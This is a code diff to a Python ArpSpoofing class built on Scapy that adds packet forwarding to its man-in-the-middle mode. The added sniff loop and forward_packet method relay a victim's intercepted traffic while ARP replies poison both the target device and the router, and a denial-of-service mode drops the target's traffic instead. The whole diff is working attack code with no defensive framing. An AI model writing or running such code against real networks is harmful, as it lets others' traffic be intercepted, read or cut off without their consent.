@@ -1,4 +1,5 @@
-from scapy.all import srp, sendp, send
+from scapy.sendrecv import sniff
+from scapy.all import srp, sendp, send, IP, TCP, UDP
 from scapy.layers.l2 import ARP , Ether
 import time
 
@@ -43,7 +44,31 @@ class ArpSpoofing:
 
         sendp(ether_frame/arp_reply, verbose=0)
 
+    def forward_packet(self, pkt, target_ip, target_mac, attacker_mac, callback, forwarded_ips):
+        # 1. Check if it's an IP packet
+        # 2. Check if the Destination IP is the phone
+        # 3. Check if the Destination MAC is YOURS (so we don't loop)
+        if pkt.haslayer(IP) and pkt[IP].dst == target_ip:
+            if pkt[Ether].dst == attacker_mac:
+                # Change the destination MAC to the phone's real MAC
+                pkt[Ether].dst = target_mac
+                # Optional: Delete checksums so Scapy recalculates them
+                # This prevents the phone from dropping "corrupt" packets
+                if pkt.haslayer(IP):
+                    del pkt[IP].chksum
+                if pkt.haslayer('TCP'):
+                    del pkt['TCP'].chksum
+                elif pkt.haslayer('UDP'):
+                    del pkt['UDP'].chksum
 
+            # Send the packet back out onto the network
+            sendp(pkt, verbose=False)
+            
+            ip_pair = (pkt[IP].src, pkt[IP].dst)
+            if ip_pair not in forwarded_ips:
+                forwarded_ips.add(ip_pair)
+                callback(f"[*] Forwarding traffic between {pkt[IP].src} and {pkt[IP].dst}")
+        
     # target ip and mac - the ip and mac of the pray, default gateway - the ip of the router
     def spoof_device(self, target_ip:str, default_gateway:str, is_mitm:bool, attacker_ip:str = "",stop_event = None, callback = None):
         def smart_sleep(secs):
@@ -72,23 +97,33 @@ class ArpSpoofing:
 
         if is_mitm and not stop_event.is_set():
             callback("Spoofing (MITM) active...")
+            callback(f"[*] Starting manual forwarder for {target_ip}...")
         else:
             callback("Spoofing (DoS) active...")
+
+        forwarded_ips = set()
 
         while not stop_event.is_set():
             try:
                 if is_mitm:
                     # Full MITM: packets go through the attacker
                     self.send_arp_response(dest_ip=target_ip, dest_mac=target_mac, 
-                                source_ip=default_gateway, source_mac=attacker_mac) #tricks pray
+                                           source_ip=default_gateway, source_mac=attacker_mac) #tricks pray
                     self.send_arp_response(dest_ip=default_gateway, dest_mac=router_mac, 
-                                source_ip=target_ip, source_mac=attacker_mac) # tricks router
+                                           source_ip=target_ip, source_mac=attacker_mac) # tricks router
+
+                    sniff(filter=f"ip dst {target_ip}", 
+                          prn=lambda pkt: self.forward_packet(pkt, target_ip, target_mac, attacker_mac, callback, forwarded_ips), 
+                          store=0, 
+                          stop_filter=lambda x: stop_event.is_set(),
+                          timeout=1)
+                          
                 else:
                     # DoS: Tell the target that the router is at our MAC (causes them to send packets to us, and we don't forward them)
                     self.send_arp_response(dest_ip=target_ip, dest_mac=target_mac, 
                                 source_ip=default_gateway, source_mac=attacker_mac)
 
-                if smart_sleep(2):
+                if smart_sleep(1):
                     break
             except Exception as e:
                 callback(f"Error: {e}")
